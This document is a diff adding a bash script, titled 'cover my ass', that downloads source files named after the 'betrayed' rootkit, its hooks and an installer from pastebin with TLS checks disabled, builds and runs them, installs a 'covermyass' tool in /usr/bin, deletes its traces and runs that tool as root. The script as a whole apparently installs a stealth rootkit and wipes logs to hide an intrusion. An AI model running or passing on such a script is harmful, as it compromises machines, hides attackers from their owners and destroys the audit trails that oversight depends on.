@@ -1,0 +1,37 @@
+cover my ass
+http://pastebin.com/raw/h7HiT3uR
+
+#!/bin/bash
+
+yum install gcc -y || apt-get install gcc -y
+yum install openssl -y || apt-get install openssl -y
+sudo rm -rf /lib/betra*
+rm -rf /lib/betra*
+wget --no-check-certificate https://pastebin.com/raw/i6NqdrUd -O- | tr -d '\r' >utils.c || curl --insecure -sSL https://pastebin.com/raw/i6NqdrUd | tr -d '\r' >utils.c
+sudo chmod 777 utils.c
+wget --no-check-certificate https://pastebin.com/raw/HgnT2sF8 -O- | tr -d '\r' >install.sh || curl --insecure -sSL https://pastebin.com/raw/HgnT2sF8 | tr -d '\r' >install.sh
+sudo chmod 777 install.sh
+wget --no-check-certificate https://pastebin.com/raw/PeZKYUVB -O- | tr -d '\r' >hooks.c || curl --insecure -sSL https://pastebin.com/raw/PeZKYUVB | tr -d '\r' >hooks.c
+sudo chmod 777 hooks.c
+wget --no-check-certificate https://pastebin.com/raw/iFW0qN5W -O- | tr -d '\r' >config.h || curl --insecure -sSL https://pastebin.com/raw/iFW0qN5W | tr -d '\r' >config.h
+sudo chmod 777 config.h
+wget --no-check-certificate https://pastebin.com/raw/h8SpSJyT -O- | tr -d '\r' >config.bak.h || curl --insecure -sSL https://pastebin.com/raw/h8SpSJyT | tr -d '\r' >config.bak.h
+sudo chmod 777 config.bak.h
+wget --no-check-certificate https://pastebin.com/raw/QDbyUQni -O- | tr -d '\r' >betrayed.h || curl --insecure -sSL https://pastebin.com/raw/QDbyUQni | tr -d '\r' >betrayed.h
+sudo chmod 777 betrayed.h
+wget --no-check-certificate https://pastebin.com/raw/AdXATS3h -O- | tr -d '\r' >betrayed.c || curl --insecure -sSL https://pastebin.com/raw/AdXATS3h | tr -d '\r' >betrayed.c
+sudo chmod 777 betrayed.c
+
+bash install.sh;
+wget --no-check-certificate https://pastebin.com/raw/kJGBHSnx -O- | tr -d '\r' >/usr/bin/covermyass || curl --insecure -sSL https://pastebin.com/raw/kJGBHSnx | tr -d '\r' >betrayed.c
+sudo chmod 777 /usr/bin/covermyass
+
+rm -rf utils.c
+rm -rf install.sh
+rm -rf hooks.c
+rm -rf config.h
+rm -rf config.bak.h
+rm -rf betrayed.h
+rm -rf betrayed.c
+rm -rf installer.sh
+sudo covermyass now
